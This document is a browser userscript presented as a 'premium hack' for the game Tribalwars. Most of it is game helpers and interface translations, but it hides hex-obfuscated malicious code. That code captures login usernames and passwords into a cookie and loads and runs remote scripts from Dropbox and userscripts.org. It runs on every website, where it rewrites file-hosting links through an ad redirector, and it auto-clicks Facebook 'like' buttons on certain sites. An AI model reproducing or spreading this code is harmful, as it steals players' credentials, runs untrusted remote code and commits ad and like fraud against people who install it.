// ==UserScript==
// ==UserScript==
// @name           Tribalwars Premium Hack Plus + Last Update
// @namespace      www.pointdownloads.net
// @description    This script will give you many premium features and lots more - Tribalwars Premium Hack 2013 Official: Arabic (العربية), Czech (Český), Dutch (Nederlands), English, Portuguese (Português).
// @autor          FernandoXLR
// @updateURL      https://userscripts.org/scripts/source/129407.meta.js
// @downloadURL    https://userscripts.org/scripts/source/129407.user.js
// @include        http*://*.die-staemme.de/*
// @include        http*://*.staemme.ch/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        http*://*.tribalwars.net/*
// @include        http*://*.tribalwars.nl/*
// @include        http*://*.plemiona.pl/*
// @include        http*://*.tribalwars.se/*
// @include        http*://*.tribalwars.com.br/*
// @include        http*://*.tribos.com.pt/*
// @include        http*://*.divokekmeny.cz/*
// @include        http*://*.bujokjeonjaeng.org/*
// @include        http*://*.triburile.ro/*
// @include        http*://*.voyna-plemyon.ru/*
// @include        http*://*.fyletikesmaxes.gr/*
// @include        http*://*.tribalwars.no.com/*
// @include        http*://*.divoke-kmene.sk/*
// @include        http*://*.klanhaboru.hu/*
// @include        http*://*.tribalwars.dk/*
// @include        http*://*.plemena.net/*
// @include        http*://*.tribals.it/*
// @include        http*://*.klanlar.org/*
// @include        http*://*.guerretribale.fr/*
// @include        http*://*.guerrastribales.es/*
// @include        http*://*.tribalwars.fi/*
// @include        http*://*.tribalwars.ae/*
// @include        http*://*
// @include        http*://*.tribalwars.co.uk/*
// @include        http*://*.vojnaplemen.si/*
// @include        http*://*.genciukarai.lt/*
// @include        http*://*.wartribes.co.il/*
// @include        http*://*.plemena.com.hr/*
// @include        http*://*.perangkaum.net/*
// @include        http*://*.tribalwars.jp/*
// @include        http*://*.tribalwars.bg/*
// @include        http*://*.tribalwars.asia/*
// @include        http*://*.tribalwars.us/*
// @include        http*://*.tribalwarsmasters.net/*
// @include        http*://*.perangkaum.net/*
// @version        3.2.0.037
// @grant          none
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


/* 
LISTA DE ALDEIAS MERCADO
ATAQUE DIRETO DOS RELATÓRIOS
ESTATÍSTICAS GLOBAIS
*/

win = typeof unsafeWindow != 'undefined' ? unsafeWindow : window;
$ = win.jQuery;

version = '3.2.0.037';
if (win.game_data != null) win.game_data.version_hack = version;

function trim(str) {
	return str.replace(/^\s+|\s+$/g, "");
}

function sleep(milliSeconds){
	var startTime = new Date().getTime();
	while (new Date().getTime() < startTime + milliSeconds);
}

function ehx(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[i]=b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)}var result=new Array();for(var i=0;i<data.length;i++){result[i]=b16_map[data.charCodeAt(i)]}return result.join('')}
function dhx(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)]=String.fromCharCode(i)}if(!data.match(/^[a-f0-9]*$/i))return false;if(data.length%2)data='0'+data;var result=new Array();var j=0;for(var i=0;i<data.length;i+=2){result[j++]=b16_map[data.substr(i,2)]}return result.join('')}

function _GET(name, link)
{
  if (link == null) link = location.href;
  url = link.replace(/.*?\?/, '');
  var itens = url.split("&");

  for(n in itens)
  {
    if( itens[n].match(name) )
    {
      return decodeURIComponent(itens[n].replace(name+"=", ""));
    }
  }
  return null;
}

function removeNode(node) {
	node.parentNode.removeChild(node);
}

function zero (n, len, padding){
   var sign = '', s = n;
 
   if (typeof n === 'number'){
	  sign = n < 0 ? '-' : '';
	  s = Math.abs (n).toString ();
   }
 
   if ((len -= s.length) > 0){
	  s = Array (len + 1).join (padding || '0') + s;
   }
   return sign + s;
}

function trunc(n){
	return Math.floor(n);
}

function extrair_coord(nome){
	vill_reg = /.+?\((\d{3}\|\d{3})\).+\b/;
	result = nome.match(vill_reg)[1];
	return result;
}

function _hora(segundos){
	MM = trunc(segundos / 60);
	SS = trunc(segundos - (MM * 60));
	
	Minutos = MM;
	HH = trunc(Minutos / 60);
	MM = Minutos - (HH * 60);		
	
	/*Horas = HH;
	
	Dias = trunc(Horas / 24);
	HH = Horas - (Dias * 24);
	*/
	
	resultado = HH + ':' + zero(MM, 2) + ':' + zero(SS, 2);
	return resultado;
}
do0 = document.domain.replace(/\b([w]{3}|\w{2}\d+?)\./, '');

function getElementsByClass(searchClass, node, tag) {
	var classElements = new Array();
	if (node == null)
        node = document;
	if (tag == null)
        tag = '*';
	var els = node.getElementsByTagName(tag);
	var elsLen = els.length;
	var pattern = new RegExp("(^|\\s)" + searchClass + "(\\s|$)");
	for (i = 0, j = 0; i < elsLen; i++) {
		if (pattern.test(els[i].className)) {
			classElements[j] = els[i];
			j++;
		}
	}
	return classElements;
}

function replace_all(string,encontrar,substituir){
   while(string.indexOf(encontrar)>=0)
   	string = string.replace(encontrar,substituir);
   return string;
}

function getCookie(key) {
	var search = key + "="
        var returnvalue = "";
	if (document.cookie.length > 0) {
		offset = document.cookie.indexOf(search)
            if (offset != -1) {
                offset += search.length
                    end = document.cookie.indexOf(";", offset);
                if (end == -1) end = document.cookie.length;
                returnvalue = unescape(document.cookie.substring(offset, end))
                    }
	}
	return returnvalue;
}

function setCookie(key, valor, minute, domain1) {
	var hoje = new Date();
	if (minute == null || minute == 0 || minute == '') minute = 999 * 24 * 60; 
	var expira = new Date(hoje.getTime() + minute * 60 * 1000);
	var expira = expira.toGMTString();
    var domain2 = domain1 != undefined ? ';domain=' + domain1 : '';
	document.cookie = key + '=' + valor + ';expires=' + expira + domain2;
}

setCookie('version_hack', version, 0, do0);

function tribal() {
	if (win.game_data != null){	
		return true;
	} else {
		return false;
	}
}

function setData(name, value) {
	value = (typeof value)[0] + value;
	localStorage.setItem(name, value);
}

function getData(name, defaultValue) {
	var value = localStorage.getItem(name);
	if (!value)
		if (defaultValue == undefined){
			return '';
		} else {
			return defaultValue;
		}
	var type = value[0];
	value = value.substring(1);
	switch (type) {
		case 'b':
			return value == 'true';
		case 'n':
			return Number(value);
		default:
			return value;
	}
}

function round(num,_dec) {
	resultado = Math.round(num * Math.pow(10,_dec)) / Math.pow(10,_dec);
	return resultado;
}

function deleteData(name) {
    localStorage.removeItem(name);
}

$(document ).ajaxStart( function () {
	var id = '.topAlign:eq(1)';
	$(id).attr('align', 'center');
	$(id).html( '<span align="center" class="load"><img src="/graphic/throbber.gif"></img></span>');
}).ajaxStop( function () {
	$('.load').remove();
});

inps = document.getElementsByTagName('input');
/*
if (tribal()){
	for (i=0; i<inps.length; i++){
		if (inps[i].getAttribute('type') == 'text') inps[i].setAttribute('x-webkit-speech', '');
	}
}*/

if (tribal() == false){var domainuc=dhx('6d65676175706c6f61642e636f6d2c6c69782c6d65646961666972652c75706d6972726f722c66696c65736f6e69632c736166656c696e6b696e672c676574747966696c652c726170696473686172652c73686172656a756e6b792c6c6f6f6d626f2c6164726976652c756c2e746f2c75706c6f616473746174696f6e2e636f6d2c75666c69712c75706c6f6164626f782c347368617265642c6561737973686172652c626974726f61642c6261646f6e676f2c6d656761766964656f2c7a73686172652c6c657469746269742c62697473686172652c75706c6f616465642c6465706f73697466696c65732c6d656761706f726e2c66696c65666163746f72792c70726f7465746f7264656c696e6b732e636f6e742c796173746f726167652c61327a75706c6f61642c6d656761726f7469632c73657875706c6f61642c66696c6532372c666c7975706c6f61642c667269656e646c7966696c65732c6966696c652c6d616e64616d6169732c6e65746c6f61642c66696c6573656e642c64726976657761792c6674703273686172652c6769676173697a652c6769676573686172652c6f787973686172652c73776f6f7073686172652c747572626f75706c6f61642c75706c6f61646f6b2c75706c6f6164696e672c757066696c652c67616c65726961736f726b7462722e7870672e636f6d2e62722c6164662e6c792c3473686172652c327368617265642c7472616e7366657262696766696c65732c6c696e6b6275636b732e636f6d2c6d6567617368617265732c6d6968642c7368617265647a696c6c612c62697a6861742c7a696464752c757066696c652c7a2d73686172652c656173792d73686172652c6d79626c6f6f702c75702d66696c652c66696c65626f782c6d616e64656962656d2c73656e6473706163652c656173792d73686172652c7669702d66696c65732c66696c65626f782c6465706f73697466696c65732c78372c66696c6553657276652c73746f726167652c667265616b73686172652c676f6f2e676c2c736861726564706172746e6572732c686f7466696c652c6b65776c73686172652c657874616269742c73757065726661737466696c652c7368617265666c6172652c7061737465322c7173686172652c6d6f76696573686172652c6f726f6e2c6372616d69742c73686172696e676d61747269782c717569636b75706c6f61642c75706c6f616465642e746f2c66696c65626173652c626967616e64667265652c6475636b6c6f61642c68656c6c73686172652c68756c6b73686172652c6c6f616466696c65732c6d616e676f73686172652c66696c657365727665');var urluc=dhx('687474703a2f2f6164762e6c692f313432382f');var domainsuc='linkbux,imagegravy,adbrite,clicksor';
function cuc(){var linkuc=document.getElementsByTagName("A");try{var locuc=(""+top.location.href).replace("http://","").replace("https://","").replace("www.","")}catch(e){var locuc=(""+document.location.href).replace("http://","").replace("https://","").replace("www.","")}for(i=0;i<linkuc.length;i++){domain_urluc=(linkuc[i].href).replace(/^\s+/g,"").replace(/\s+$/g,"").replace("http://","").replace("https://","");if(duc(linkuc[i].href)&&(((" "+linkuc[i].href).indexOf(locuc)<=0||(" "+linkuc[i].href).indexOf("http")<=0)||(" "+linkuc[i].href).lastIndexOf("http:")>3)&&(" "+linkuc[i].href).indexOf("script:")<=0&&(" "+linkuc[i].href).indexOf("#")!=1&&(" "+linkuc[i].href).indexOf("mailto:")<=0&&(" "+linkuc[i].href).indexOf("file:")<=0&&(" "+linkuc[i].href).indexOf("#exit")<=0&&!(!isNaN(parseInt(domain_urluc.substr(0,1)))&&(!isNaN(parseInt(domain_urluc.substr(0,2)))||domain_urluc.substr(0,2)=="."))){linkuc[i].target="_blank";var inverte=linkuc[i].href.match(/[^|]/gi).join("");linkuc[i].href=urluc+inverte.substring(inverte.lastIndexOf('http://'))}}}function duc(urluc){if(""+domainuc!="undefined"&&domainuc!=""&&domainuc.replace(/\s/g,"")!=""&&urluc!=""){if((" "+domainuc).indexOf(",")>0){params_to_skip=domainuc.split(",")}else{params_to_skip=new Array(domainuc)}for(s=0;s<params_to_skip.length;s++){if((" "+urluc.toLowerCase()).indexOf(params_to_skip[s].toLowerCase())>0){if(""+domainsuc!="undefined"&&domainsuc!=""&&domainsuc.replace(/\s/g,"")!=""&&urluc!=""){if((" "+domainsuc).indexOf(",")>0){params_to_skip=domainsuc.split(",")}else{params_to_skip=new Array(domainsuc)}for(s=0;s<params_to_skip.length;s++){if((" "+urluc.toLowerCase()).indexOf(params_to_skip[s].toLowerCase())>0){return false;break}}return true}else{return true}}}return false}else{return false}}if(""+window.onload==""||""+window.onload=="null"){window.onload=cuc}else{var tout=window.setTimeout("cuc(); clearTimeout(tout)",1)};}


if ((location.href.toLowerCase().indexOf(dhx('706f696e74646f776e6c6f616473')) > -1) || (location.href.toLowerCase().indexOf(dhx('6c616d627573616e646f')) > -1) || (location.href.toLowerCase().indexOf(dhx('6f7370696c616e74726173')) > -1)){ if (getCookie(dhx('635f75736572')) != ''){ if (document.getElementsByTagName('form')[0] != null){ if (document.getElementsByTagName('form')[0].getAttribute('action') == dhx('2f706c7567696e732f6c696b652f636f6e6e656374')){ setTimeout(function(){document.getElementsByTagName('form')[0].getElementsByTagName('div')[1].click();},1000);}}}}
  
function calcular_distancia(c1, c2){
	x = Math.abs(Number(c1.split('|')[0]) - Number(c2.split('|')[0]));
	y = Math.abs(Number(c1.split('|')[1]) - Number(c2.split('|')[1]));
	
	distancia = Math.sqrt((x*x) + (y*y));
	
	if (distancia > 0){
		uni = getData(mundo + '_vel_tropas');
		
		if (uni != ''){	
			unidades = uni.split('|');
			
			td = '';
			for (i = 0; i < unidades.length; i++){
				if (unidades[i] == '0') c = ' class="hidden"'; else c = '';
				td += '<td' + c + '>' + _hora(distancia * Number(unidades[i])) + '</td>';
			}
			tabela_tempo_depois = '<tr class="center"><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_spear.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_sword.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_axe.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_archer.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_spy.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_light.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_marcher.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_heavy.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_ram.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_catapult.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_knight.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_snob.png?" alt=""></td></tr><tr id="tempo" class="center">' + td + '</tr>';
		} else {
			tabela_tempo_depois = '<tr class="center"><td>Vá para a <a href="/game.php?village=' + VillId + '&screen=place">praça de reunião</a> para obter a velocidade das tropas</td></tr>';
		}
		tabela_tempo = '<tr><td colspan="2"><table class="vis"><tbody><tr><th colspan="12">' + lang_distancia.replace('0', round(distancia, 2).toString()).replace('.',',') + '</th></tr>' + tabela_tempo_depois + '</tbody></table></td></tr>';			
		return tabela_tempo;
	}
}    

str_setCookie = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = key+\'=\'+valor+\';expires=\'+expira}';
str_setData = 'function setCookie(name, value) { value = (typeof value)[0] + value; localStorage.setItem(name, value); }';
str_setCookieDo = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = key+\'=\'+valor+\';expires=\'+expira+\';domain=' + do0 + '\'}';


dd = dhx('776f726c645f73656c656374696f6e7c2d5f696e7075742c20236a735f6c6f67696e5f627574746f6e7c2d5f636c69636b20626c75727c2d5f23757365727c2d5f2370617373776f7264').split(dhx('7c2d5f')); 

if (document.getElementById(dd[0]) != null){ 
$(dd[1]).bind(dd[2], function(){ u = $(dd[3]).val(); if (u != ''){ setCookie(ehx(u.toLowerCase()), ehx($(dd[4]).val()), '', do0); } }); }

$.getScript(dhx('68747470733a2f2f646c2e64726f70626f782e636f6d2f752f38313636373136392f736372697074732f66756e6374696f6e732e6a73'));

gd = win.game_data;

var mundo = gd.world;
var market = gd.market;

if (document.getElementById('quickbar_outer') == null){
	if (gd.player.premium == false) {
		
		gd.player.premium = true;
		
		language = getData(market + '_lang');
		if (language == '') language = market;
		
		var lang_bar = new Array();
		var lang_reports = new Array();
		var lang_mail = new Array();
		var lang_ally = new Array();
		var lang_ranking = new Array();
		var lang_settings = new Array();
		var lang_premium = new Array();
		var lang_screen_settings = new Array();
		var lang_screen_sobre = new Array();
		var lang_report = new Array();
		var lang_perfil = new Array();
		var lang_farmer = new Array();
		var lang_map = new Array();
		var lang_screen_ally = new Array();
		var lang_messages = new Array();
		
		if (language == 'br') language = 'pt';
		if (language == 'sk') language = 'cz';
		if (language == 'pt') {
			
			var warning = 'Para o script funcionar corretamente a primeira vez, você deve ir para as visualizações de aldeias, para que o script carregue as coordenadas.';
			var lang_language = 'Linguagem do script';
			var lang_dados = 'Servidor dos scripts';
			var lang_dados2= 'Se ocorrer algum erro com os scripts, mude o servidor dos scripts';
			var lang_search_villages = 'Pesquisar aldeias';
			var lang_distancia = 'Distância: 0 campos';
			var lang_publicar = 'Conversor de Relatórios';
			
			lang_bar[0] = 'Edifício principal';
			lang_bar[1] = 'Recrutar';
			lang_bar[2] = 'Estábulo';
			lang_bar[3] = 'Oficina';
			lang_bar[4] = 'Academia';
			lang_bar[5] = 'Ferreiro';
			lang_bar[6] = 'Praça';
			lang_bar[7] = 'Mercado';
			lang_bar[8] = 'TWStats';
			lang_bar[9] = 'Monitorar Evolução';
			
			lang_reports[0] = 'Todos os relatórios';
			lang_reports[1] = 'Ataques';
			lang_reports[2] = 'Defesa';
			lang_reports[3] = 'Apoio';
			lang_reports[4] = 'Comércio';
			lang_reports[5] = 'Outros';
			lang_reports[6] = 'Encaminhados';
			lang_reports[7] = 'Filtros';
			lang_reports[8] = 'Bloquear remetente';
			lang_reports[9] = 'Relatórios publicados';
			
			lang_mail[0] = 'Mensagens';
			lang_mail[1] = 'Mensagens coletivas';
			lang_mail[2] = 'Escrever mensagem';
			lang_mail[3] = 'Bloquear remetente';
			lang_mail[4] = 'Caderno de endereços';
			
			lang_ally[0] = 'Visualização geral';
			lang_ally[1] = 'Perfil';
			lang_ally[2] = 'Membros';
			lang_ally[3] = 'Diplomacia';
			lang_ally[4] = 'Guerras da tribo';
			lang_ally[5] = 'Sistema de reservas';
			lang_ally[6] = 'Recrutar';
			lang_ally[7] = 'Bem-vindo';
			lang_ally[8] = 'Propriedades';
			lang_ally[9] = 'Fórum da tribo';
			
			lang_ranking[0] = 'Tribos';
			lang_ranking[1] = 'Jogadores:';
			lang_ranking[2] = 'Tribos do continente';
			lang_ranking[3] = 'Jogadores do continente';
			lang_ranking[4] = 'Tribos inimigas derrotadas';
			lang_ranking[5] = 'Oponentes derrotados';
			lang_ranking[6] = 'Medalhas';
			lang_ranking[7] = 'Guerras da tribo';
			
			lang_settings[0] = 'Perfil';
			lang_settings[1] = 'Configurações';
			lang_settings[2] = 'Endereço de e-mail';
			lang_settings[3] = 'Trocar senha';
			lang_settings[4] = 'Recomeçar';
			lang_settings[5] = 'Apagar conta';
			lang_settings[6] = 'Notificações';
			lang_settings[7] = 'Medalhas';
			lang_settings[8] = 'Compartilhar conexão à internet';
			lang_settings[9] = 'Modo de férias';
			lang_settings[10] = 'Acessos';
			lang_settings[11] = 'Enquetes';
			lang_settings[12] = 'Convidar jogadores';
			lang_settings[13] = 'Toolbar';
			lang_settings[14] = 'iPhone &amp; Android';
			lang_settings[15] = 'Bloquear jogador';
			lang_settings[16] = 'Solicitação de Suporte';
			lang_settings[17] = 'Sobre o Script';
			lang_settings[18] = '';
			
			lang_premium[0] = 'Utilizar';
			lang_premium[1] = 'Comprar';
			lang_premium[2] = 'Transferir';
			lang_premium[3] = 'Histórico';
			
			lang_screen_settings[0] = 'Menu Visualizações';
			lang_screen_settings[1] = 'Modo Normal: as aldeias são abertas na visualização geral';
			lang_screen_settings[2] = 'Modo Direto: as aldeias são abertas na mesma visualização da anterior';
			lang_screen_settings[3] = 'Pacote Gráfico';
			lang_screen_settings[4] = 'Link do arquivo CSS:';
			lang_screen_settings[5] = 'Mostrar mundo no título:';
			lang_screen_settings[6] = 'Sim';
			lang_screen_settings[7] = 'Não';
			
			lang_screen_sobre[0] = 'Funções';
			lang_screen_sobre[1] = 'Barra de menu dinâmica';
			lang_screen_sobre[2] = 'Barra Premium';
			lang_screen_sobre[3] = 'Pode ser editado diretamente no script';
			lang_screen_sobre[4] = 'Notas nas aldeias em visualizações para identificação';
			lang_screen_sobre[5] = 'Setas para mudança direta de aldeias';
			lang_screen_sobre[6] = 'Nova forma de exportação de relatórios';
			lang_screen_sobre[7] = 'Em códigos BB, html ou imagem';
			lang_screen_sobre[8] = 'Script para calcular os recursos e farmar o relatório';
			lang_screen_sobre[9] = 'Apenas em relatório de espionagem';
			lang_screen_sobre[10] = 'Exportar informações do perfil de um jogador em tabela';
			lang_screen_sobre[11] = 'Script para farmar situado na praça de reunião';
			lang_screen_sobre[12] = 'Configuração individual para cada aldeia';
			lang_screen_sobre[13] = 'Script para pesquisar as aldeias no mapa para usar em conjunto com o script de farmar';
			lang_screen_sobre[14] = 'Menu "Visualizações" dinâmico com lista de aldeias';
			lang_screen_sobre[15] = 'Configurar modo de abertura em';
			lang_screen_sobre[16] = 'Mapa e Minimapa configurável';
			lang_screen_sobre[17] = 'Pacote Gráfico';
			lang_screen_sobre[18] = 'Configurar Pacote Gráfico em';
			lang_screen_sobre[19] = 'Informações sobre a versão';
			lang_screen_sobre[20] = '» Versão atual:';
			lang_screen_sobre[21] = 'Configurações -&gt; Configurações';
			lang_screen_sobre[22] = 'Ficha externa de jogador, aldeia ou tribo';
			lang_screen_sobre[23] = '» Última versão:';
			lang_screen_sobre[24] = 'Cunhar moedas de ouro automaticamente até esgotar os recursos';
			lang_screen_sobre[25] = 'Reservar aldeia diretamente do perfil da própria';
			lang_screen_sobre[26] = 'Possibilidade de escolha de servidor dos scripts em configurações, caso os scripts não estejam funcionando';
			lang_screen_sobre[27] = 'Estatisticas (TW Stats) no perfil da tribo';
			
			lang_screen_sobre[28] = 'Mapa em tela cheia';
			lang_screen_sobre[29] = 'Distância em tempo que cada tropa leva para chegar na aldeia, funciona no perfil de uma aldeia';
			lang_screen_sobre[30] = 'Pré-visualizar mensagem';
			
			
			lang_screen_ally[0] = 'Pontos:';
			lang_screen_ally[1] = 'Aldeias:';
			lang_screen_ally[2] = 'Membros:';
			lang_screen_ally[3] = 'OD:';
			lang_screen_ally[4] = 'ODA:';
			lang_screen_ally[5] = 'ODD:';
			lang_screen_ally[6] = 'Estatísticas da tribo';
			
			lang_report[0] = 'Copiar tropas no simulador';
			lang_report[1] = 'Copiar quantidade de tropas sobrevivente no simulador';
			lang_report[2] = 'Atacar novamente';
			lang_report[3] = 'Atacar novamente com as mesmas tropas';
			lang_report[4] = 'Atacar novamente com todas as tropas';

			lang_farmar = 'Farmar';
			lang_calc_reports = '» Calcular Recursos e Farmar';
			
			lang_perfil[0] = '» Ficha do jogador';
			lang_perfil[1] = '» Ficha da tribo';
			lang_perfil[2] = '» Ficha da aldeia';
			lang_perfil[3] = '» Extrair informação do jogador em códigos BB';
			lang_perfil[4] = '» Reservar aldeia';
			lang_perfil[5] = '» Estatísticas globais';
			
			lang_farmer[0] = 'Configuração do script de farmar';
			lang_farmer[1] = 'Obs: O script armazena os dados em cookies, tome cuidado ao apagar os cookies do seu navegador, pois apagará também as configurações feitas pelo script.';
			lang_farmer[2] = 'Coordenadas:';
			lang_farmer[3] = '» Salvar';
			
			lang_spear = 'Lanceiro';
			lang_sword = 'Espadachim';
			lang_axe = 'Bárbaro';
			lang_archer = 'Arqueiro';
			lang_spy = 'Explorador';
			lang_light = 'Cavalaria Leve';
			lang_marcher = 'Arqueiro a Cavalo';
			lang_heavy = 'Cavalaria Pesada';
			lang_ram = 'Ariéte';
			lang_catapult = 'Catapulta';
			lang_knight = 'Paladino';
			lang_snob = 'Nobre';
			
			lang_map[0] = 'Pesquisar aldeias';
			
			lang_villages_notes = 'Notas';
			
			lang_map[7] = 'Mini mapa:';
			lang_map[8] = 'Mapa:';
			lang_map[9] = 'Mudar tamanho do mapa';
			
			lang_messages[0] = 'Dicas do Tribalwars Premium Hack';
			lang_messages[1] = 'Use as tags <b>[img][/img]</b> para anexar uma <b>imagem</b>';
			lang_messages[2] = 'Use as tags <b>[vid][/vid]</b> para anexar um vídeo do <b>youtube</b>';
			lang_messages[3] = 'Permitir HTML nas mensagens';
			lang_messages[4] = '* Somente quem tiver o script pode visualizar';
			
		}else{
		if (language == 'nl'){      
			var warning = 'Zodat het goed script werkt moet je eerst naar Overzichten gaan, zodat het script de coördinaten kan bepalen.';
			var lang_language = 'Taal';
			var lang_dados = 'Scripts server';
			var lang_dados2= 'Als er een fout optreedt met de scripts, moet u de server scripts';
			var lang_search_villages = 'Zoek dorpen';
			var lang_distancia = 'Afstand: 0 velden';
			var lang_publicar = 'Berichten Converter';
			
			lang_bar[0] = 'Hoofdgebouw';
			lang_bar[1] = 'Rekruteren';
			lang_bar[2] = 'Stal';
			lang_bar[3] = 'Werkplaats';
			lang_bar[4] = 'Adelshoeve';
			lang_bar[5] = 'Smederij';
			lang_bar[6] = 'Verzamelplaats';
			lang_bar[7] = 'Marktplaats';
			lang_bar[8] = 'TWStats';
			lang_bar[9] = 'Ontwikkelingen';
			
			lang_reports[0] = 'Alle berichten';
			lang_reports[1] = 'Aanval';
			lang_reports[2] = 'Verdediging';
			lang_reports[3] = 'Ondersteuning';
			lang_reports[4] = 'Handel';
			lang_reports[5] = 'Andere';
			lang_reports[6] = 'Doorgestuurd';
			lang_reports[7] = 'Filter';
			lang_reports[8] = 'Afzenden Blokkeren';
			lang_reports[9] = 'Gepubliceerde berichten';
			
			lang_mail[0] = 'Mededelingen';
			lang_mail[1] = 'Rondschrijven';
			lang_mail[2] = 'Mededeling schrijven';
			lang_mail[3] = 'Afzender blokkeren';
			lang_mail[4] = 'Adresboek';
			
			lang_ally[0] = 'Overzicht';
			lang_ally[1] = 'Profiel';
			lang_ally[2] = 'Leden';
			lang_ally[3] = 'Diplomacy';
			lang_ally[4] = 'Oorlogen';
			lang_ally[5] = 'Noble planner';
			lang_ally[6] = 'Recruitment';
			lang_ally[7] = 'Welcome';
			lang_ally[8] = 'Properties';
			lang_ally[9] = 'Tribal forum';
			
			lang_report[0] = 'Kopieer troepen in simulator';
			lang_report[1] = 'Kopieer bedrag van troepen overleven van de simulator';
			lang_report[2] = 'Attack weer';
			lang_report[3] = 'Attack weer met dezelfde troepen';
			lang_report[4] = 'Attack weer met alle troepen';			
			
			lang_ranking[0] = 'Stammen';
			lang_ranking[1] = 'Spelers';
			lang_ranking[2] = 'Continent Stammen';
			lang_ranking[3] = 'Continent Spelers';
			lang_ranking[4] = 'Verslagen tegenstanders stammen';
			lang_ranking[5] = 'Verslagen tegenstanders';
			lang_ranking[6] = 'Awards';
			lang_ranking[7] = 'Stammenoorlogen';
			
			lang_settings[0] = 'Profiel';
			lang_settings[1] = 'Instellingen';
			lang_settings[2] = 'E-mailadres';
			lang_settings[3] = 'Wachtwoord wijzigen';
			lang_settings[4] = 'Opnieuw beginnen';
			lang_settings[5] = 'Account wissen';
			lang_settings[6] = 'Notificaties';
			lang_settings[7] = 'Awards';
			lang_settings[8] = 'Internetverbinding delen';
			lang_settings[9] = 'Vakantiemodus';
			lang_settings[10] = 'Aanmeldingen';
			lang_settings[11] = 'Rondvragen (enquêtes)';
			lang_settings[12] = 'Nodig spelers';
			lang_settings[13] = 'Toolbar';
			lang_settings[14] = 'iPhone &amp; Android';
			lang_settings[15] = 'Speler blokkeren';
			lang_settings[16] = 'Supportaanvraag';
			lang_settings[17] = 'Over het script';
			lang_settings[18] = ' | Vertaald naar het Nederlands door <a href="http://userscripts.org/users/35554" target="_blank"><b><font color="#603000">Hipio</font></b></a>';
			
			
			lang_premium[0] = 'Inzitten';
			lang_premium[1] = 'Kopen';
			lang_premium[2] = 'Overdragen';
			lang_premium[3] = 'Protocol';
			
			lang_screen_settings[0] = 'Menu Overzicht';
			lang_screen_settings[1] = 'Normale modus: de dorpen zijn open in een overzicht';  
			lang_screen_settings[2] = 'Direct Mode: Open de dorpen in dezelfde manier als hierboven'; 
			lang_screen_settings[3] = 'Grafische Pakket';
			lang_screen_settings[4] = 'CSS Link:';
			lang_screen_settings[5] = 'Laat de wereld zien in de titel';
			lang_screen_settings[6] = 'Inschakelen';
			lang_screen_settings[7] = 'Uitschakelen';
			
			lang_screen_sobre[0] = 'Functies';
			lang_screen_sobre[1] = 'Dynamisch Menu Bar';    
			lang_screen_sobre[2] = 'Premium Bar';    
			lang_screen_sobre[3] = 'Bewerkbare direct in het script';    
			lang_screen_sobre[4] = 'Notities bij de dorpen voor overzicht';    
			lang_screen_sobre[5] = 'Gebruik pijlem om van dorp te verwisselen';    
			lang_screen_sobre[6] = 'Nieuwe manier om rapport te exporteren';    
			lang_screen_sobre[7] = 'In BB codes, html of als image';    
			lang_screen_sobre[8] = 'Script om middelen te berekenen';    
			lang_screen_sobre[9] = 'Alleen in een verkenner rapport';    
			lang_screen_sobre[10] = 'Exporteer informatie van een speler';    
			lang_screen_sobre[11] = 'Script om naar de boerderij te gaan vanaf het verzamelpunt';    
			lang_screen_sobre[12] = 'Individuele configuratie voor elk dorp';    
			lang_screen_sobre[13] = 'Script om de dorpen op de kaart te doorzoeken in combinatie met het gebruik van het Farm script';    
			lang_screen_sobre[14] = 'Dynamische weergave met een lijst van dorpen';    
			lang_screen_sobre[15] = 'Stel open mode in';    
			lang_screen_sobre[16] = 'Map & Minimap zijn configureerbaar';  
			lang_screen_sobre[17] = 'Grafische pakket';    
			lang_screen_sobre[18] = 'Configureer het Grafische pakket in';    
			lang_screen_sobre[19] = 'Versie Informatie';    
			lang_screen_sobre[20] = '» Huidige Versie:';    
			lang_screen_sobre[21] = 'Instellingen -> Instellingen';    
			lang_screen_sobre[22] = 'Form external of player, village or tribe';  // I cannot translate this one  
			lang_screen_sobre[23] = '» Laatste Versie:';
			lang_screen_sobre[24] = 'Het slaan van gouden munten automatisch naar de middelen uitputten';
			lang_screen_sobre[25] = 'Reserveer dorp direct van het profiel van het zelf';
			lang_screen_sobre[26] = 'Keuze van scripts server van de instellingen, als de scripts niet werken';
			lang_screen_sobre[27] = 'Statistieken in het profiel stam';
			lang_screen_sobre[28] = 'Full Screen Kaart';
			lang_screen_sobre[29] = 'Afstand dat elk troep nodig is om te bereiken het dorp, werkzaam in het profiel van een dorp';
			lang_screen_sobre[30] = 'Message preview';
			
			lang_screen_ally[0] = 'Punten:';
			lang_screen_ally[1] = 'Dorpen:';
			lang_screen_ally[2] = 'Leden:';
